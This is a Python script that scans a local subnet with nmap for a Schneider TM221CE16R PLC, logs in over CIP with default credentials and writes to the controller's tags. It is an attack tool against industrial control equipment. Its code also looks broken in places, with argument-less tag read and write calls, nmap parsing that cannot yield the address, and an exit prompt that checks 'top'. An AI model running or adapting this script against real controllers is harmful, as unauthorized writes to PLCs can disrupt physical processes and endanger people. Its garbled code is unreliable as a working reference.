import subprocess
from scapy.all import *
import time
import threading
from pycomm import CIP

# Define the subnet to scan
subnet = '192.168.1.0/24'

def find_plc_ip(subnet):
    try:
        output = subprocess.check_output(['nmap', '-sP', subnet]).decode('utf-8')
        for line in output.split('\n'):
            if 'TM221CE16R' in line:  
                ip_address = line.split(' ')[-1]
                return ip_address
    except Exception as e:
        print(f"Failed to find PLC IP: {e}")
        return None

def use_default_credentials(plc_ip):
    try:
        # Create a CIP connection to the PLC
        cip_client = CIP.Client(plc_ip, 44818)
        
        # Use default credentials to login to the PLC
        default_username = 'admin'  # Replace with the actual default username
        default_password = 'password'  # Replace with the actual default password
        cip_client.connect()
        cip_client.login(default_username, default_password)
        
        # Check if the login was successful
        if cip_client.is_logged_in():
            print(f"Default credentials used to login to PLC: {plc_ip}")
            # Perform actions on the PLC using the default credentials
            cip_client.read_tags()
            cip_client.write_tags()
        else:
            print(f"Failed to login to PLC using default credentials: {plc_ip}")
    except Exception as e:
        print(f"Failed to use default credentials: {e}")

def main():
    plc_ip = find_plc_ip(subnet)
    if plc_ip:
        print(f"PLC IP Address: {plc_ip}")
        
        # Use default credentials to gain access to the PLC
        use_default_credentials(plc_ip)
        
        while True:
            user_input = input("Type 'top' to stop using default credentials: ")
            if user_input.lower() == 'top':
                break
    else:
        print("PLC not found.")

if __name__ == "__main__":
    main()